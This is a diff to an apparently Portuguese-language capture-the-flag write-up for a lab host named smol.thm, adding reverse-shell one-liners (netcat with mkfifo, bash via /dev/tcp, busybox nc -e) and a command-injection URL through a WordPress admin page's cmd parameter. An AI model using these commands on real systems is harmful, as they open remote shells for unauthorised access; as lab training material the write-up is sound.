@@ -105,6 +105,12 @@ retornando seu conteúdo em texto puro.
 
 ### Ganhando uma shell no servidor:
 
+    - mkfifo /tmp/f; nc IP PORTA < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f
+    - bash -i >& /dev/tcp/IP/PORTA 0>&1
+    |_> Não funcionou
+
+    - busybox nc IP PORTA -e sh (funcionou)
+
 --> http://www.smol.thm/wp-admin/index.php?cmd=busybox nc IP PORTA -e sh
 
 Busybox foi usado porque o netcat padrão do sistema não suporta a opção -e. O busybox é como se fosse um canivete suíço com vários binários em um só.
